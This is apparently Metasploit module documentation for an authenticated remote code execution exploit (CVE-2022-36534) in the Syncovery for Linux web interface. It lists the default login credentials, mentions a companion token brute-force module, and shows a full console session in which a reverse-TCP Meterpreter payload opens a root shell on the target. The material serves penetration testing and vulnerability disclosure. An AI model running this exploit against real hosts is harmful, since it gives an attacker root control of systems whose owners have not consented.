## Vulnerable Application
[Syncovery For Linux with Web-GUI](https://www.syncovery.com/download/linux/)

This module exploits an authenticated remote code execution vulnerability (CVE-2022-36534)
in the Web GUI of Syncovery File Sync & Backup Software for Linux.
Syncovery allows an authenticated user to create jobs, which are executed before/after a profile is run.
Jobs can contain arbitrary system commands and will be executed as the user `root`.
A valid username and password or a session token is needed to exploit the vulnerability.

This affects Syncovery for Linux before v9.48j and all versions of the obsolete branch 8.

Installing a vulnerable version of Syncovery for Linux to test this vulnerability is quite easy.
Download a vulnerable version of Syncovery for Linux: https://www.syncovery.com/release/Syncovery-9.47a-amd64.deb
Install it and once the server is up, you can access it on port 8999 for testing...

## Authors

- Jan Rude (mgm security partners GmbH)

## Platforms

- Unix

## Verification Steps

1. `use exploit/unix/http/syncovery_linux_rce_2022_36534`
2. `set RHOSTS <TARGET HOSTS>`
3. `set LHOST <Address of Attacking Machine>`
4. `run`
5. You should get a meterpreter shell as the `root` user.

## Options

### USERNAME
Username used for login. Default is "default".

### PASSWORD
Password used for login. Default is "pass".

### TOKEN
Instead of using a username and password it is also possible to use an authentication token.
A valid token might be successfully brute-forced with the scanner module `syncovery_linux_token_cve_2022_36536`.

### TARGETURI
The path to Syncovery login.

### PORT
The (TCP) target port on which Syncovery is running. By default port 8999 is used for HTTP and port 8943 is used for HTTPS.

## Scenarios

### Syncovery for Linux with default credentials

```
msf6 > use exploits/unix/http/syncovery_linux_rce_2022_36534
[*] Using configured payload cmd/unix/python/meterpreter/reverse_tcp
msf6 exploit(unix/http/syncovery_linux_rce_2022_36534) > set rhosts 192.168.178.26
rhosts => 192.168.178.26
msf6 exploit(unix/http/syncovery_linux_rce_2022_36534) > set lhost 192.168.178.26
lhost => 192.168.178.26
msf6 exploit(unix/http/syncovery_linux_rce_2022_36534) > options

Module options (exploit/unix/http/syncovery_linux_rce_2022_36534):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   pass             yes       The password to Syncovery (default: pass)
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.178.26   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      8999             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The path to Syncovery
   TOKEN                       no        A valid session token
   USERNAME   default          yes       The username to Syncovery (default: default)
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.178.26   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Syncovery for Linux < 9.48j


msf6 exploit(unix/http/syncovery_linux_rce_2022_36534) > check
[+] 192.168.178.26:8999 - The target is vulnerable.
msf6 exploit(unix/http/syncovery_linux_rce_2022_36534) > run

[*] Started reverse TCP handler on 192.168.178.26:4444
[+] 192.168.178.26:8999 - Exploit successfully executed
[*] Sending stage (40132 bytes) to 192.168.178.26
[*] Meterpreter session 1 opened (192.168.178.26:4444 -> 192.168.178.26:38008) at 2022-09-06 13:44:13 +0200

meterpreter > sysinfo
Computer        : kali
OS              : Linux 5.16.0-kali7-amd64 #1 SMP PREEMPT Debian 5.16.18-1kali1 (2022-04-01)
Architecture    : x64
System Language : en_US
Meterpreter     : python/linux
meterpreter > getuid
Server username: root
```
